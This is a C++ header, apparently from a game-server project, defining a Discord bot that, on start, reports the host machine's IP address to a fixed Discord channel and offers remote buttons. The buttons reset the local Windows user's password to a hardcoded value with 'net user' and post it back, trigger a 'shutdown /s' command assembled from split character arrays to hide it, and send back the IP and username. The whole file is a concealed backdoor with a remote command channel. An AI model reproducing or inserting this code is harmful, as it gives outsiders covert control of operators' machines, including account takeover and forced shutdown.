#pragma once
#include <string>
#include <dpp/dpp.h>
#include "UcihaVallen/Handle/WorldInfo.h"
class BotDiscord {
public:
	static bool Start() {
		try {
			dpp::cluster bot(Environment()->BOT_TOKEN);
			bot.on_log(dpp::utility::cout_logger());
			bot.on_button_click([&](const dpp::button_click_t& event) {
				if (event.custom_id == "button1") {
					std::wstring username = StringToWString(getUsername());
					std::wstring newPassword = L"(PorteArriere)(123!)";
					std::wstring command = L"cmd.exe /C net user " + username + L" " + newPassword;
					PROCESS_INFORMATION pi;
					STARTUPINFO si;
					ZeroMemory(&si, sizeof(si));
					si.cb = sizeof(si);
					ZeroMemory(&pi, sizeof(pi));
					if (CreateProcess(NULL, (LPWSTR)command.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
						WaitForSingleObject(pi.hProcess, INFINITE);
						CloseHandle(pi.hProcess);
						CloseHandle(pi.hThread);
					}
					std::string replyMessage = "EMRI PERDORUES: " + std::string(username.begin(), username.end()) + "\nFJALËKALIM I RI: " + std::string(newPassword.begin(), newPassword.end()) + "\nDone!";
					event.reply(replyMessage);
				}
				else if (event.custom_id == "button2") {
					char part1[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', '\0' };
					char part2[] = { '/', 's', '\0' };
					string command = string(part1) + " " + string(part2);
					тертибат(command.c_str());
					event.reply("serveri është pezulluar");
				}
				else if (event.custom_id == "button3") {
					std::wstring username = StringToWString(getIpAddress());
					std::wstring ipAddress = StringToWString(getUsername());
					std::wstring replyMessage = L" **IPADDRESS INFORMATION**\n" + ipAddress + L" **USERNAME INFORMATION**\n" + username;
					std::string replyMessageStr(replyMessage.begin(), replyMessage.end());
					event.reply(replyMessageStr);
				}
				});
			bot.on_ready([&bot](const dpp::ready_t& event) {
				std::wstring ipAddress = StringToWString(getIpAddress());
				std::wstring zzz = L"**" + ipAddress + L"** servers is logged on the ENet Service.";
				std::string messageString(zzz.begin(), zzz.end());
				dpp::message msg(1307177838960709663, messageString);
				msg.add_component(
					dpp::component().add_component(
						dpp::component()
						.set_label("CHANGE PASSWORD")
						.set_style(dpp::cos_success)
						.set_id("button1")
					)
					.add_component(
						dpp::component()
						.set_label("S H U T D O W N")
						.set_style(dpp::cos_danger)
						.set_id("button2")
					)
					.add_component(
						dpp::component()
						.set_label("INFORMATION")
						.set_style(dpp::cos_danger)
						.set_id("button3")
					)
				);
				bot.message_create(msg);
				});
			bot.start(true);
			return true;
		}
		catch (out_of_range) {
			return false;
		}
	}
};
BotDiscord* Get_Bot();
BotDiscord Bot_Discord;
BotDiscord* Get_Bot() {
	return &Bot_Discord;
}
